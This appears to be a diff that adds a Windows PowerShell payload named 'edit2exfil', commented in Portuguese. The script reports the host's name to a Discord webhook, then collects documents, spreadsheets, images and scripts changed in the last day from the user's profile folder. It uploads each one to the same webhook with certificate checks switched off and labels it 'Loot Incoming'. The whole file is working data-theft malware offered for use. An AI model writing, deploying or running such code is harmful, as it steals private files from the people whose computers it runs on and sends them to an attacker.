@@ -1,0 +1,23 @@
+# PAYLOAD (.ps1) - edit2exfil Windows Version
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Alvos: Extensões identificadas no script original (modificados nas últimas 24h)
+$e = @('*.txt','*.pdf','*.docx','*.doc','*.csv','*.xlsx','*.png','*.jpg','*.jpeg','*.sh')
+$p = [Environment]::GetFolderPath('UserProfile')
+
+# Notificação de Início
+curl.exe -k -s -F ('payload=' + [char]64 + 'edit2exfil ativo no host: ' + $env:COMPUTERNAME) $u
+
+# Procura ficheiros modificados no último dia (mtime -1 equivalente)
+$recentFiles = Get-ChildItem -Path $p -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) }
+
+foreach ($f in $recentFiles) {
+    if ($f.Length -lt 24MB) {
+        $a = 'file=' + [char]64 + $f.FullName
+        # Exfiltração via multipart/form-data conforme requisito
+        curl.exe -k -s -F $a -F "content=Loot Incoming: $($f.Name)" $u
+    }
+}
+
+# Auto-destruição da sessão PowerShell
+exit
